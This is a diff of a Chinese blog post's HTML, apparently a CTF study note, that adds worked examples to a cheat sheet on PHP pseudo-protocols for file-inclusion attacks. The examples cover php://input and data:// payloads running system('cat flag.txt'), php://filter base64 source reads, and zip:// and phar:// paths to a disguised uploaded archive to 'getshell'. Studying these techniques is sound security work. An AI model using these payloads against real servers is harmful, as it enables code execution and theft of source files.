@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="alin&#39;Blog">
 <meta property="og:description" content="php伪协议相关知识文件读取相关函数 include require include_once require_once highlight_file show_source readfile file_get_contents fopen file  file:&#x2F;&#x2F;协议 allow_url_fopen:off&#x2F;on allow_url_include:off&#x2F;on  双off状态也能使用，用于读">
 <meta property="article:published_time" content="2020-05-15T11:48:17.000Z">
-<meta property="article:modified_time" content="2020-07-20T01:36:16.074Z">
+<meta property="article:modified_time" content="2021-04-04T11:44:50.291Z">
 <meta property="article:author" content="alin">
 <meta name="twitter:card" content="summary">
 
@@ -384,9 +384,16 @@
 <li>file=php://input post写入：<?php system('cat flag.txt');?></li>
 </ul>
 <h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><ul>
-<li>用于读取源码并进行base64编码输出</li>
-<li>php.ini 在双off情况下也能正常使用</li>
-<li>语法：php://filter/read=convert.base64-encode/resource=./flag.php</li>
+<li><p>用于读取源码并进行base64编码输出</p>
+</li>
+<li><p>php.ini 在双off情况下也能正常使用</p>
+</li>
+<li><p>语法：php://filter/read=convert.base64-encode/resource=./flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.php</span><br><span class="line">回显结果：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.php</span><br><span class="line">POST:&lt;?php phpinfo();?&gt;</span><br><span class="line">回显结果：phpinfo（）执行的结果</span><br><span class="line"></span><br><span class="line">2、访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.php </span><br><span class="line">回显结果：PD9waHAgIA0KcGhwaW5mbygpOw0KPz4&#x3D;</span><br><span class="line"></span><br><span class="line">3、访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;resource&#x3D;1.php</span><br><span class="line">回显结果：phpinfo()执行的结果</span><br><span class="line"></span><br><span class="line">4、访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;PD9waHAgIA0KcGhwaW5mbygpOw0KPz4&#x3D;（可以是其他任意字符，这里我只是想和第二种情况好比较）</span><br><span class="line">回显结果：Warning: include(PD9waHAgIA0KcGhwaW5mbygpOw0KPz4&#x3D;): failed to open stream: No such file or directory in C:\phpStudy\WWW\test.php on line 2</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
 </ul>
 <h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul>
 <li>访问请求原始数据只读流，将post请求的数据作为PHP执行。</li>
@@ -402,8 +409,11 @@
 <li>属于压缩流，可以访问压缩文件中的自文件，不需要指定后缀名。</li>
 </ul>
 <h5 id="zip-压缩文件绝对路径-压缩文件内的子文件名"><a href="#zip-压缩文件绝对路径-压缩文件内的子文件名" class="headerlink" title="zip://[压缩文件绝对路径]#[压缩文件内的子文件名]"></a>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</h5><ul>
-<li>zip://D:/soft/phpstudy/www/file.jpg%23phpcode.txt</li>
-<li>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</li>
+<li><p>zip://D:/soft/phpstudy/www/file.jpg%23phpcode.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;zip:&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;WWW&#x2F;test.jpg%23即可getshell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</p>
+</li>
 </ul>
 <h5 id="compress-bzip2-file-bz2"><a href="#compress-bzip2-file-bz2" class="headerlink" title="compress.bzip2://file.bz2"></a>compress.bzip2://file.bz2</h5><ul>
 <li>compress.bzip2://D:/soft/phpstudy/www/file.jpg or compress.bzip2://./file.jpg</li>
@@ -412,13 +422,23 @@
 <li>compress.zlib://D:/soft/phpStudy/WWW/file.jpg or compress.zlib://./file.jpg</li>
 </ul>
 <h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><ul>
-<li>php.ini 必须双on才能使用</li>
-<li>语法：data://text/plain,<?php phpinfo()?><br>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br>data:text/plain,<?php phpinfo()?><br>data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</li>
-<li>data://text/plain;cgarset=utf-8,<?php system('cat flag.txt');?></li>
+<li><p>php.ini 必须双on才能使用</p>
+</li>
+<li><p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt; </span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; </span><br><span class="line">data:text&#x2F;plain,&lt;?php phpinfo()?&gt; </span><br><span class="line">data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>data://text/plain;cgarset=utf-8,<?php system('cat flag.txt');?></p>
+</li>
 </ul>
 <h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h5 id="stub基本结构"><a href="#stub基本结构" class="headerlink" title="stub基本结构"></a>stub基本结构</h5><ul>
-<li>&lt;?php HALT_COMPILER();, stub必须以HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。</li>
-<li>php.ini文件中phar.readonly=Off,不然无法生成phar文件。</li>
+<li><p>&lt;?php HALT_COMPILER();, stub必须以HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。</p>
+</li>
+<li><p>php.ini文件中phar.readonly=Off,不然无法生成phar文件。</p>
+</li>
+<li><p>这种和zip伪协议差不多，用法有一点点区别一个是“#”,一个是“/”<br>phar://archive.zip/dir/file.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同理访问http:&#x2F;&#x2F;localhost:88&#x2F;test.php?file&#x3D;phar:&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;WWW&#x2F;test.jpg&#x2F;即可getshell</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <h4 id="利用zip或phar伪协议读取压缩包中的文件"><a href="#利用zip或phar伪协议读取压缩包中的文件" class="headerlink" title="利用zip或phar伪协议读取压缩包中的文件"></a>利用zip或phar伪协议读取压缩包中的文件</h4><ul>
 <li>phar://./images/1499394959.jpg/1.php<br>zip://./images/1499394959.jpg%231.php<br>文件压缩后，改成jpg格式，文件名以md5加密访问，zip访问需要#</li>
@@ -579,7 +599,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -645,7 +665,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
